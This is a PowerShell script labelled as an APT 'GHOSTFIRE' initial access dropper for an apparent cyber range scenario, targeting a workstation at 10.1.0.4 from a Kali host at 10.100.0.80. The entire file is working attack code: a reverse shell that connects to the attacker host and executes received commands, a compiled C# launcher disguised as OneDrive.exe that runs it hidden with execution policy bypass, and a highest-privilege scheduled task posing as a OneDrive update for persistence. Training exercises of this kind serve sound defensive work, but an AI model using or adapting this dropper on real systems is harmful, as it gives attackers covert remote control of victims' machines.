# ==============================================================================
# AJEX APT GHOSTFIRE INITIAL ACCESS DROPPER (SCENARIO 1)
# Victim: BT1-CYCOM-WS1 (10.1.0.4) | Attacker: Kali VM 170 (10.100.0.80:4433)
# ==============================================================================

$TargetDir = "C:\Program Files (x64)\Microsoft"
if (!(Test-Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

$PayloadPath = "$TargetDir\OneDrive.exe"
$PsScriptPath = "$TargetDir\OneDrive.ps1"

# 1. Write the background reverse beacon script (TCP port 4433)
$ScriptContent = @'
$client = New-Object System.Net.Sockets.TCPClient("10.100.0.80", 4433);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "GHOSTFIRE-SHELL> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};
$client.Close();
'@

[System.IO.File]::WriteAllText($PsScriptPath, $ScriptContent)

# 2. Compile lightweight executable wrapper OneDrive.exe
$Source = @"
using System;
using System.Diagnostics;
namespace MicrosoftOneDrive {
    class Program {
        static void Main(string[] args) {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -File \"C:\\Program Files (x64)\\Microsoft\\OneDrive.ps1\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }
    }
}
"@

Add-Type -TypeDefinition $Source -Language CSharp -OutputAssembly $PayloadPath -OutputType ConsoleApplication

# 3. Create persistent Scheduled Task (every 15 minutes)
$action = New-ScheduledTaskAction -Execute "$PayloadPath"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration ([TimeSpan]::MaxValue)
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName "MicrosoftOneDriveUpdate" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

Write-Host "[+] Scheduled task 'MicrosoftOneDriveUpdate' registered successfully." -ForegroundColor Green

# 4. Spawn initial process
Start-Process -FilePath $PayloadPath
Write-Host "[+] Masqueraded payload spawned: $PayloadPath (Connecting to 10.100.0.80:4433)" -ForegroundColor Green
